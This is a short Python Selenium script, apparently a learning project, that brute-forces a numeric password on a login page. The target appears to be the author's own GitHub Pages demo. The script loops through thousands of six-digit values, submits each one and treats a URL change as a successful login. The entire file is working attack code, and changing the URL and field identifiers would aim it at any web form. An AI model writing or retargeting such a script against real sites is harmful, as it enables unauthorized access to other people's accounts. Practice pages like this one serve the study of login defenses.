import time
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

chrome_driver_path = r"C:/Users/volta/OneDrive/Documents/Programmes/Brute-force-attack/chromedriver-win64/chromedriver.exe"
options = webdriver.ChromeOptions()
options.add_experimental_option("detach", False) 
driver = webdriver.Chrome(options=options)

url = "https://nxthxn-dev.github.io/Brute-force-attack/index.html"
driver.get(url)

start_range = 123449
end_range = 130000
original_url = driver.current_url
found = False  

for password in range(start_range, end_range):
    try:
   
        input_field = WebDriverWait(driver, 5).until(
            EC.presence_of_element_located((By.ID, "password"))
        )
        submit_button = WebDriverWait(driver, 5).until(
            EC.element_to_be_clickable((By.TAG_NAME, "button"))
        )

        input_field.clear()
        input_field.send_keys(str(password))
        submit_button.click()

        time.sleep(1)  

        if driver.current_url != original_url:
            print(f"[FOUND] Password found: {password}")
            found = True
            break 

    except Exception as e:
        print(f"[X] Tried {password}, incorrect. Error: {e}")  
        continue  

if found:
    print("Stopping execution as password has been found.")

time.sleep(2)  
driver.quit()  